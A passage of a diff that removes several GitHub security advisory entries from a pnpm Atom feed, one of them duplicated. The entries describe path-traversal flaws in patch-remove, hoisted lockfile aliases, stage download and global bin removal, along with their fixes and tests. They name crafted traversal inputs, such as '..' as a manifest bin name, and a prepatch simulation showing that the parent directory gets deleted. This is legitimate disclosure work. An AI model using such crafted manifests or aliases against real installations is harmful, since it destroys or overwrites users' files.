-<li>Parent directories are canonicalized before deletion, including the case where a nested symlink points outside and the final outside entry is itself dangling.</li>
-<li>The complete batch is validated before any file is removed.</li>
-<li>Component-aware predicates accept valid names beginning with <code>..</code> while still rejecting parent traversal, Windows drive escapes, and UNC escapes.</li>
-<li>Valid files and symlinked patch directories whose canonical targets remain below the lockfile directory continue to work.</li>
-<li>A final symlink inside a valid patch directory is unlinked without following its target, including when the target is outside or dangling.</li>
-</ul>
-<h2 id="exploit-replay">Exploit replay</h2>
-<p>Before the patch, a workspace <code>patchedDependencies</code> path that resolved outside the project caused <code>pnpm patch-remove</code> to delete the external sentinel. A second replay used a nested parent symlink and a dangling outside victim: <code>realpath()</code> returned <code>ENOENT</code>, yet the victim was still removed. With this patch, both paths are rejected and the outside entries remain intact.</p>
-<h2 id="files-changed">Files changed</h2>
-<ul>
-<li><code>patching/commands/src/isSubdirectory.ts</code> performs component-aware containment checks.</li>
-<li><code>patching/commands/src/patchRemove.ts</code> validates the full batch, canonicalizes parents, and unlinks final entries without following them.</li>
-<li><code>patching/commands/test/{isSubdirectory,patchRemove}.test.ts</code> covers traversal, nested symlinks, dangling victims, and valid removals.</li>
-</ul>
-<h2 id="commands-run">Commands run</h2>
-<pre><code class="language-text">$ pnpm --filter @pnpm/patching.commands test test/isSubdirectory.test.ts test/patchRemove.test.ts
-PASS: 11 tests across 2 suites
-$ pnpm --filter @pnpm/patching.commands run compile
-PASS
-$ git diff --check
-PASS
-</code></pre>
-<h2 id="validation">Validation</h2>
-<ul>
-<li>Focused handler and path-predicate suites: 11 passed across 2 suites.</li>
-<li>Package-wide ESLint: passed.</li>
-<li>Package TypeScript build: passed.</li>
-<li>Commit hooks, Commitlint, and <code>git diff --check</code>: passed.</li>
-<li>The broader integration harness was environment-blocked because it writes outside the available temporary root; focused handler tests used <code>/private/tmp</code>.</li>
-</ul>
-<h2 id="patches">Patches</h2>
-<p><code>10.34.4</code>: <a href="https://github.com/pnpm/pnpm/commit/352ae489f1b14ffdc19d2c6eacb1b06b098c2ddc">https://github.com/pnpm/pnpm/commit/352ae489f1b14ffdc19d2c6eacb1b06b098c2ddc</a>
-<code>11.7.0</code>: <a href="https://github.com/pnpm/pnpm/commit/612a2e6a7333f2b061f452a21b6e62c1c161747f">https://github.com/pnpm/pnpm/commit/612a2e6a7333f2b061f452a21b6e62c1c161747f</a></p>
-<h2 id="compatibility">Compatibility</h2>
-<p>Missing patch files remain no-ops. Valid symlinked patch directories continue to work when their canonical target stays inside the lockfile directory, and final symlinks are removed without touching their targets. <code>patch-remove</code> is not yet in pacquet's command surface, so no Rust-side parity change is required.</p>
-<h2 id="remaining-risk">Remaining risk</h2>
-<p>Portable Node APIs do not expose directory-fd-relative <code>unlinkat()</code>. A local attacker who can replace an already validated parent directory before the unlink may still win a time-of-check/time-of-use race. The reproduced repository-controlled traversal and symlink paths do not require that concurrent capability and are blocked by this patch.</p>
-<hr>
-<p>Written by an agent (Codex, GPT-5).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-72r4-9c5j-mj57">https://github.com/pnpm/pnpm/security/advisories/GHSA-72r4-9c5j-mj57</a></li>
-<li><a href="https://github.com/pnpm/pnpm/commit/612a2e6a7333f2b061f452a21b6e62c1c161747f">https://github.com/pnpm/pnpm/commit/612a2e6a7333f2b061f452a21b6e62c1c161747f</a></li>
-<li><a href="http://github.com/pnpm/pnpm/commit/352ae489f1b14ffdc19d2c6eacb1b06b098c2ddc">http://github.com/pnpm/pnpm/commit/352ae489f1b14ffdc19d2c6eacb1b06b098c2ddc</a></li>
-<li><a href="https://github.com/advisories/GHSA-72r4-9c5j-mj57">https://github.com/advisories/GHSA-72r4-9c5j-mj57</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-72r4-9c5j-mj57</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-27T00:12:39.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pnpm] pnpm: Hoisted install imports lockfile alias outside node_modules]]></title>
-        <id>https://github.com/advisories/GHSA-fr4h-3cph-29xv</id>
-        <link href="https://github.com/advisories/GHSA-fr4h-3cph-29xv"/>
-        <updated>2026-06-27T00:03:05.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The hoisted dependency alias issue tracked as GHSA-fr4h-3cph-29xv / CAND-PNPM-059 has been addressed in both pnpm and pacquet.</p>
-<p>A crafted lockfile alias could be joined directly under a hoisted <code>node_modules</code> directory. Traversal aliases could escape that directory, while reserved aliases such as <code>.bin</code> or <code>.pnpm</code> could overwrite pnpm-owned layout. This patch validates package-name semantics and path containment before graph insertion or filesystem work.</p>
-<h2 id="security-boundary">Security boundary</h2>
-<ul>
-<li>The TypeScript hoisted graph uses the shared safe join helper at the actual <code>dep.name</code> sink.</li>
-<li>The helper rejects traversal, absolute, platform-specific, and reserved package names.</li>
-<li>Pacquet validates the hoister's <code>dep.0.name</code> before adding the graph node or recursing.</li>
-<li>Both implementations return <code>ERR_PNPM_INVALID_DEPENDENCY_NAME</code>.</li>
-<li>Pacquet uses the same dependency-name containment rule at its hoisted graph sink as it uses for direct dependency aliases.</li>
-</ul>
-<h2 id="exploit-replay">Exploit replay</h2>
-<p>Before the patch, a traversal alias in a hoisted lockfile imported package files outside the intended install root. With this patch, both pnpm and pacquet reject the alias before graph insertion or filesystem work, and the escaped file is not created.</p>
-<h2 id="files-changed">Files changed</h2>
-<ul>
-<li><code>fs/symlink-dependency/src/safeJoinModulesDir.ts</code> provides the TypeScript containment helper.</li>
-<li><code>installing/deps-restorer/src/lockfileToHoistedDepGraph.ts</code> validates the parsed dependency name at the hoisted graph sink.</li>
-<li><code>pacquet/crates/package-manager/src/{hoisted_dep_graph.rs,safe_join_modules_dir.rs}</code> mirrors that boundary in Rust.</li>
-<li>TypeScript and Rust tests cover traversal, reserved aliases, and valid scoped names.</li>
-</ul>
-<h2 id="commands-run">Commands run</h2>
-<pre><code class="language-text">$ pnpm --filter @pnpm/fs.symlink-dependency test
-PASS: 24 tests
-$ pnpm --filter @pnpm/installing.deps-restorer test test/index.ts
-PASS: exploit regression and positive install control
-$ cargo test --locked -p pacquet-package-manager --lib
-PASS: 426 tests
-$ cargo fmt --all -- --check
-PASS
-</code></pre>
-<h2 id="validation">Validation</h2>
-<ul>
-<li>TypeScript symlink helper: 24 passed.</li>
-<li>TypeScript exploit regression: 1 passed.</li>
-<li>TypeScript positive hoisted-install control: 1 passed.</li>
-<li>Targeted strict TypeScript compiles: passed.</li>
-<li>Targeted ESLint: zero errors.</li>
-<li>Pacquet helper tests: 3 passed.</li>
-<li>Full pacquet package-manager library suite: 426 passed.</li>
-<li><code>cargo fmt</code>, parsed two-document lockfile validation, and <code>git diff --check</code>: passed.</li>
-</ul>
-<h2 id="patch">Patch</h2>
-<p>Ready-for-review private PR: <a href="https://github.com/pnpm/pnpm-ghsa-fr4h-3cph-29xv/pull/1">https://github.com/pnpm/pnpm-ghsa-fr4h-3cph-29xv/pull/1</a></p>
-<p>GitHub reports the branch as mergeable and has requested review from <code>zkochan</code>. GitHub intentionally does not run status checks on temporary private-fork PRs; the commands and outcomes above are the recorded local validation: <a href="https://docs.github.com/code-security/security-advisories/collaborating-in-a-temporary-private-fork-to-resolve-a-security-vulnerability">https://docs.github.com/code-security/security-advisories/collaborating-in-a-temporary-private-fork-to-resolve-a-security-vulnerability</a></p>
-<h2 id="compatibility">Compatibility</h2>
-<p>Valid unscoped and scoped package aliases continue to work. The changeset covers <code>@pnpm/fs.symlink-dependency</code>, <code>@pnpm/installing.deps-restorer</code>, and <code>pnpm</code>; pacquet is updated in the same commit for CLI parity.</p>
-<hr>
-<p>Written by an agent (Codex, GPT-5).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-fr4h-3cph-29xv">https://github.com/pnpm/pnpm/security/advisories/GHSA-fr4h-3cph-29xv</a></li>
-<li><a href="https://github.com/advisories/GHSA-fr4h-3cph-29xv">https://github.com/advisories/GHSA-fr4h-3cph-29xv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fr4h-3cph-29xv</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-27T00:02:51.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pnpm] pnpm: Hoisted install imports lockfile alias outside node_modules]]></title>
-        <id>https://github.com/advisories/GHSA-fr4h-3cph-29xv</id>
-        <link href="https://github.com/advisories/GHSA-fr4h-3cph-29xv"/>
-        <updated>2026-06-27T00:03:05.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The hoisted dependency alias issue tracked as GHSA-fr4h-3cph-29xv / CAND-PNPM-059 has been addressed in both pnpm and pacquet.</p>
-<p>A crafted lockfile alias could be joined directly under a hoisted <code>node_modules</code> directory. Traversal aliases could escape that directory, while reserved aliases such as <code>.bin</code> or <code>.pnpm</code> could overwrite pnpm-owned layout. This patch validates package-name semantics and path containment before graph insertion or filesystem work.</p>
-<h2 id="security-boundary">Security boundary</h2>
-<ul>
-<li>The TypeScript hoisted graph uses the shared safe join helper at the actual <code>dep.name</code> sink.</li>
-<li>The helper rejects traversal, absolute, platform-specific, and reserved package names.</li>
-<li>Pacquet validates the hoister's <code>dep.0.name</code> before adding the graph node or recursing.</li>
-<li>Both implementations return <code>ERR_PNPM_INVALID_DEPENDENCY_NAME</code>.</li>
-<li>Pacquet uses the same dependency-name containment rule at its hoisted graph sink as it uses for direct dependency aliases.</li>
-</ul>
-<h2 id="exploit-replay">Exploit replay</h2>
-<p>Before the patch, a traversal alias in a hoisted lockfile imported package files outside the intended install root. With this patch, both pnpm and pacquet reject the alias before graph insertion or filesystem work, and the escaped file is not created.</p>
-<h2 id="files-changed">Files changed</h2>
-<ul>
-<li><code>fs/symlink-dependency/src/safeJoinModulesDir.ts</code> provides the TypeScript containment helper.</li>
-<li><code>installing/deps-restorer/src/lockfileToHoistedDepGraph.ts</code> validates the parsed dependency name at the hoisted graph sink.</li>
-<li><code>pacquet/crates/package-manager/src/{hoisted_dep_graph.rs,safe_join_modules_dir.rs}</code> mirrors that boundary in Rust.</li>
-<li>TypeScript and Rust tests cover traversal, reserved aliases, and valid scoped names.</li>
-</ul>
-<h2 id="commands-run">Commands run</h2>
-<pre><code class="language-text">$ pnpm --filter @pnpm/fs.symlink-dependency test
-PASS: 24 tests
-$ pnpm --filter @pnpm/installing.deps-restorer test test/index.ts
-PASS: exploit regression and positive install control
-$ cargo test --locked -p pacquet-package-manager --lib
-PASS: 426 tests
-$ cargo fmt --all -- --check
-PASS
-</code></pre>
-<h2 id="validation">Validation</h2>
-<ul>
-<li>TypeScript symlink helper: 24 passed.</li>
-<li>TypeScript exploit regression: 1 passed.</li>
-<li>TypeScript positive hoisted-install control: 1 passed.</li>
-<li>Targeted strict TypeScript compiles: passed.</li>
-<li>Targeted ESLint: zero errors.</li>
-<li>Pacquet helper tests: 3 passed.</li>
-<li>Full pacquet package-manager library suite: 426 passed.</li>
-<li><code>cargo fmt</code>, parsed two-document lockfile validation, and <code>git diff --check</code>: passed.</li>
-</ul>
-<h2 id="patch">Patch</h2>
-<p>Ready-for-review private PR: <a href="https://github.com/pnpm/pnpm-ghsa-fr4h-3cph-29xv/pull/1">https://github.com/pnpm/pnpm-ghsa-fr4h-3cph-29xv/pull/1</a></p>
-<p>GitHub reports the branch as mergeable and has requested review from <code>zkochan</code>. GitHub intentionally does not run status checks on temporary private-fork PRs; the commands and outcomes above are the recorded local validation: <a href="https://docs.github.com/code-security/security-advisories/collaborating-in-a-temporary-private-fork-to-resolve-a-security-vulnerability">https://docs.github.com/code-security/security-advisories/collaborating-in-a-temporary-private-fork-to-resolve-a-security-vulnerability</a></p>
-<h2 id="compatibility">Compatibility</h2>
-<p>Valid unscoped and scoped package aliases continue to work. The changeset covers <code>@pnpm/fs.symlink-dependency</code>, <code>@pnpm/installing.deps-restorer</code>, and <code>pnpm</code>; pacquet is updated in the same commit for CLI parity.</p>
-<hr>
-<p>Written by an agent (Codex, GPT-5).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-fr4h-3cph-29xv">https://github.com/pnpm/pnpm/security/advisories/GHSA-fr4h-3cph-29xv</a></li>
-<li><a href="https://github.com/advisories/GHSA-fr4h-3cph-29xv">https://github.com/advisories/GHSA-fr4h-3cph-29xv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fr4h-3cph-29xv</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-27T00:02:51.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pnpm] pnpm: `stage download` writes outside its destination directory via manifest name/version traversal]]></title>
-        <id>https://github.com/advisories/GHSA-v23m-ccfg-pq9h</id>
-        <link href="https://github.com/advisories/GHSA-v23m-ccfg-pq9h"/>
-        <updated>2026-06-26T23:54:53.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The staged-tarball filename traversal reported as GHSA-v23m-ccfg-pq9h / CAND-PNPM-038 is fixed on <code>main</code> by <a href="https://github.com/pnpm/pnpm/pull/12303">pnpm/pnpm#12303</a>, merged as <code>65443f4bdf1f0db9c8c7dc58fee25252607e9234</code>.</p>
-<p>Before the fix, <code>pnpm stage download</code> derived a local filename from registry-controlled package name and version fields. A crafted manifest could escape the selected download directory and overwrite another reachable file. The merged fix validates both fields, derives one safe filename, and verifies the final destination before writing.</p>
-<h2 id="security-boundary">Security boundary</h2>
-<ul>
-<li>Package names and semantic versions are validated before they can influence a local filename.</li>
-<li>POSIX and Windows path separators are rejected by basename checks.</li>
-<li>Stage download and tarball summary paths use the same filename helper.</li>
-<li>The resolved output path must remain an immediate child of the selected download directory.</li>
-<li>The stage identifier is already constrained to a UUID.</li>
-</ul>
-<h2 id="exploit-replay">Exploit replay</h2>
-<p>Before <code>65443f4bdf</code>, a traversal-bearing manifest version could make the command write outside the selected directory. After the fix, malicious package names fail with <code>ERR_PNPM_INVALID_PACKAGE_NAME</code>, malicious versions fail with <code>ERR_PNPM_INVALID_PACKAGE_VERSION</code>, no outside file is created, and the download directory remains empty.</p>
-<h2 id="files-changed">Files changed</h2>
-<ul>
-<li><code>releasing/commands/src/tarball/safeTarballFilename.ts</code> validates manifest identity and rejects cross-platform path separators.</li>
-<li><code>releasing/commands/src/stage/download.ts</code> verifies the resolved destination before writing.</li>
-<li><code>releasing/commands/src/tarball/summarizeTarball.ts</code> uses the same filename contract.</li>
-<li><code>releasing/commands/test/stage.test.ts</code> covers traversal through both package name and version.</li>
-<li><code>.changeset/stale-stage-tarballs.md</code> includes patch bumps for <code>@pnpm/releasing.commands</code> and <code>pnpm</code>.</li>
-</ul>
-<h2 id="patch">Patch</h2>
-<ul>
-<li>Merged PR: <a href="https://github.com/pnpm/pnpm/pull/12303">https://github.com/pnpm/pnpm/pull/12303</a></li>
-<li>Fix commit: <code>65443f4bdf1f0db9c8c7dc58fee25252607e9234</code></li>
-<li>The private candidate branch was not submitted because it conflicts with and is superseded by the merged fix. The upstream patch is slightly stronger because it covers malicious package names as well as versions.</li>
-</ul>
-<h2 id="commands-run">Commands run</h2>
-<pre><code class="language-text">$ git diff --check 65443f4bdf^ 65443f4bdf
-PASS
-$ gh pr view 12303 --repo pnpm/pnpm --json state,mergeCommit,statusCheckRollup
-MERGED as 65443f4bdf
-</code></pre>
-<h2 id="validation">Validation</h2>
-<ul>
-<li>Upstream regression coverage rejects traversal through both manifest name and version and verifies that no outside file is created.</li>
-<li>Compile and lint, dependency audit, Linux Node.js 22/24/26, CodeQL, and zizmor checks passed on the merged public PR.</li>
-<li>The Windows Node.js 22 full-suite job timed out in the unrelated <code>pnpm/test/dlx.ts</code> cache test after 512 other tests passed. The PR was merged by the maintainer; the failure did not involve the staging code.</li>
-<li>The earlier private candidate's focused exploit regression, positive control, package compile, ESLint, and <code>git diff --check</code> also passed.</li>
-</ul>
-<h2 id="compatibility">Compatibility</h2>
-<p>Staging and release commands are TypeScript-only. Pacquet does not expose this command family, so no Rust-side port is required.</p>
-<h2 id="remaining-risk">Remaining risk</h2>
-<p>The final <code>fs.writeFile</code> follows a pre-existing symlink at the exact in-directory output name. That requires separate local filesystem access and is not controllable through the registry manifest traversal described here.</p>
-<hr>
-<p>Written by an agent (Codex, GPT-5).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-v23m-ccfg-pq9h">https://github.com/pnpm/pnpm/security/advisories/GHSA-v23m-ccfg-pq9h</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55700">https://nvd.nist.gov/vuln/detail/CVE-2026-55700</a></li>
-<li><a href="https://github.com/pnpm/pnpm/pull/12303">https://github.com/pnpm/pnpm/pull/12303</a></li>
-<li><a href="https://github.com/advisories/GHSA-v23m-ccfg-pq9h">https://github.com/advisories/GHSA-v23m-ccfg-pq9h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-v23m-ccfg-pq9h</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-26T23:54:52.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pnpm] pnpm: Reserved bin name deletes PNPM_HOME during global remove]]></title>
-        <id>https://github.com/advisories/GHSA-4gxm-v5v7-fqc4</id>
-        <link href="https://github.com/advisories/GHSA-4gxm-v5v7-fqc4"/>
-        <updated>2026-06-26T23:46:53.000Z</updated>
-        <content type="html"><![CDATA[<details>
-<summary>Maintainer Action Plan</summary>
-
-<h2 id="maintainer-action-plan">Maintainer Action Plan</h2>
-<p>This report is ready to review with the shared patch branch. Start with the PR and the expected fixed behavior, then use the detailed exploit narrative below only if you want to replay the original path.</p>
-<ul>
-<li>Advisory: <code>CAND-PNPM-085</code> / <code>GHSA-4gxm-v5v7-fqc4</code></li>
-<li>Advisory URL: <a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-4gxm-v5v7-fqc4">https://github.com/pnpm/pnpm/security/advisories/GHSA-4gxm-v5v7-fqc4</a></li>
-<li>Shared patch PR: <a href="https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1">https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1</a></li>
-<li>Shared patch branch: <code>security/ghsa-batch-2026-06-09</code></li>
-<li>Patch commit: <code>a93449314f398cf4bdf2e28d033c02d37395ad22</code></li>
-<li>Base commit: <code>origin/main</code> <code>55a4035abf1ae3fe7208ba1f5ef43c5eff58ccec</code></li>
-<li>Maintainer priority: <code>appendix</code></li>
-<li>Component: <code>pnpm global add/remove bin cleanup</code></li>
-<li>Patch area: bin name/path segment validation</li>
-<li>Affected packages: <code>npm:pnpm</code></li>
-<li>CWE IDs: <code>CWE-22</code>, <code>CWE-73</code></li>
-<li>Conservative CVSS: <code>6.5</code> / <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></li>
-<li>Next action: review the shared patch branch for this component, set the final affected version range, merge and release the fix, then publish or close the advisory.</li>
-</ul>
-<h3 id="expected-patched-behavior">Expected Patched Behavior</h3>
-<p>Reserved, dot, and path-segment bin names are rejected or ignored; global remove leaves <code>PNPM_HOME</code> and the sentinel file intact.</p>
-<h3 id="files-and-tests-to-review">Files And Tests To Review</h3>
-<ul>
-<li><code>bins/resolver/src/index.ts</code></li>
-<li><code>bins/resolver/test/index.ts</code></li>
-<li><code>global/commands/test/globalRemove.test.ts</code></li>
-<li><code>pacquet/crates/cmd-shim/src/bin_resolver.rs</code></li>
-<li><code>pacquet/crates/cmd-shim/src/bin_resolver/tests.rs</code></li>
-<li><code>.changeset/strange-bin-segments.md</code></li>
-</ul>
-<h3 id="focused-validation">Focused Validation</h3>
-<p>Run these from a checkout of the shared patch branch. They are the useful maintainer commands with machine-local artifact paths removed.</p>
-<ul>
-<li>Use the private PR checks plus the patched replay coverage matrix for this candidate.</li>
-</ul>
-<p>The full patched replay for the shared branch passed with all 20 candidates marked fixed. This candidate's replay evidence is <code>results/CAND-PNPM-085-patched-result.json</code>.</p>
-
-
-<h2>Title</h2>
-<p>Reserved manifest bin names can make global package operations delete outside the global bin directory</p>
-</details>
-
-<h2 id="description">Description</h2>
-<h3 id="summary">Summary</h3>
-<p>Manifest <code>bin</code> object keys such as <code>""</code>, <code>"."</code>, and <code>".."</code> passed pnpm's bin-name guard. When a malicious package was installed globally, later global remove, update, or add-replacement flows could re-derive those names from the installed manifest and pass <code>path.join(globalBinDir, binName)</code> to <code>removeBin</code>. For <code>"."</code> this targets the global bin directory; for <code>".."</code> this targets its parent.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerable dataflow was:</p>
-<ul>
-<li><code>bins/resolver/src/index.ts</code> converted manifest <code>bin</code> object keys to <code>binName</code> and only required URL-safe text or <code>$</code>. Empty, dot, dot-dot, and scoped forms such as <code>@scope/..</code> were not rejected after scope stripping.</li>
-<li><code>global/packages/src/scanGlobalPackages.ts</code> scanned installed global package manifests and returned manifest-derived <code>bin.name</code> values.</li>
-<li><code>global/commands/src/globalRemove.ts</code>, <code>global/commands/src/globalUpdate.ts</code>, and global add replacement logic joined those names to <code>globalBinDir</code>.</li>
-<li><code>bins/remover/src/removeBins.ts</code> recursively removed the resulting path.</li>
-</ul>
-<p>Install-time checks did not close the gap: bin target paths were package-root checked, conflict checks looked at the same escaped path but did not reject reserved segments, and bin-link warning paths could leave the package installed for later global operations.</p>
-<h3 id="poc">PoC</h3>
-<p>Run:</p>
-<p>The script first performs a safe prepatch simulation in a temporary directory:</p>
-<pre><code class="language-text">prepatch_reserved_bin_name=..
-prepatch_delete_target=/.../cand-pnpm-085.XXXXXX/home
-prepatch_deleted_global_bin_parent=true
-</code></pre>
-<p>It then validates the patched implementation:</p>
-<pre><code class="language-bash">./node_modules/.bin/tsgo --build bins/resolver/tsconfig.json
-./node_modules/.bin/tsgo --build global/commands/tsconfig.json
-./node_modules/.bin/eslint bins/resolver/src/index.ts bins/resolver/test/index.ts global/commands/test/globalRemove.test.ts
-cd bins/resolver
-NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts --runInBand
-cd global/commands
-NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/globalRemove.test.ts -t "global remove ignores reserved manifest bin names" --runInBand
-cargo fmt --manifest-path pacquet/crates/cmd-shim/Cargo.toml --check
-cargo test --manifest-path pacquet/crates/cmd-shim/Cargo.toml bin_resolver --lib
-git diff --check -- bins/resolver global/commands/test/globalRemove.test.ts pacquet/crates/cmd-shim .changeset/strange-bin-segments.md pnpm-lock.yaml
-</code></pre>
-<p>The patched resolver no longer emits reserved bin names, and the global-remove regression proves the deletion sink receives only <code>path.join(globalBinDir, "good")</code>.</p>
-<h3 id="impact">Impact</h3>
-<p>Direct confidentiality impact was not validated for this primitive; the sink is deletion/corruption, not a read or disclosure path.</p>
-<h2 id="affected-products">Affected Products</h2>
-<p>Ecosystem: npm</p>
-<p>Package name: <code>pnpm</code></p>
-<p>Affected versions: versions before the patch that accept reserved manifest bin names in TypeScript global package flows.</p>
-<p>Patched versions: pending release containing the shared bin-name hardening.</p>
-<h2 id="severity">Severity</h2>
-<p>Corrected vulnerable severity: High</p>
-<p>Corrected vulnerable vector string: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H</code></p>
-<p>Corrected vulnerable score: 8.1</p>
-<p>Final post-patch score: 0.0, not vulnerable after patch.</p>
-<p>The original scan score was 8.3 with <code>C:H/I:H/A:L</code>. Revalidation removes direct confidentiality impact and raises availability to high because the sink can recursively delete the global bin directory or its parent.</p>
-<h2 id="weaknesses">Weaknesses</h2>
-<p>CWE-22: Improper Limitation of a Pathname to a Restricted Directory</p>
-<p>CWE-73: External Control of File Name or Path</p>
-<h2 id="patch">Patch</h2>
-<ul>
-<li><code>bins/resolver/src/index.ts</code> now rejects empty, dot, and dot-dot bin names after scope stripping.</li>
-<li><code>bins/resolver/test/index.ts</code> covers empty, dot, dot-dot, and scoped reserved bin keys.</li>
-<li><code>global/commands/test/globalRemove.test.ts</code> proves global remove filters reserved manifest bin names before deletion and only removes a safe <code>good</code> shim.</li>
-<li><code>pacquet/crates/cmd-shim/src/bin_resolver.rs</code> mirrors the same reserved-name rejection; empty names were already rejected.</li>
-<li><code>pacquet/crates/cmd-shim/src/bin_resolver/tests.rs</code> extends parity coverage.</li>
-<li><code>.changeset/strange-bin-segments.md</code> records patch releases for <code>@pnpm/bins.resolver</code>, <code>pnpm</code>, and <code>pacquet</code>.</li>
-</ul>
-<p>Pacquet parity is appropriate at the shared bin resolver/linker boundary because pacquet dependency-management commands can resolve and link package bins, even though the TypeScript-only global remove/update/add replacement flow is the concrete destructive-delete sink.</p>
-<h2 id="validation">Validation</h2>
-<p>Passed locally:</p>
-<p>The script passed TypeScript builds, ESLint, <code>bins/resolver</code> Jest, global-remove sink Jest, pacquet fmt/tests, and <code>git diff --check</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-4gxm-v5v7-fqc4">https://github.com/pnpm/pnpm/security/advisories/GHSA-4gxm-v5v7-fqc4</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55699">https://nvd.nist.gov/vuln/detail/CVE-2026-55699</a></li>
-<li><a href="https://github.com/advisories/GHSA-4gxm-v5v7-fqc4">https://github.com/advisories/GHSA-4gxm-v5v7-fqc4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4gxm-v5v7-fqc4</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-26T23:46:53.000Z</published>
     </entry>
 </feed>
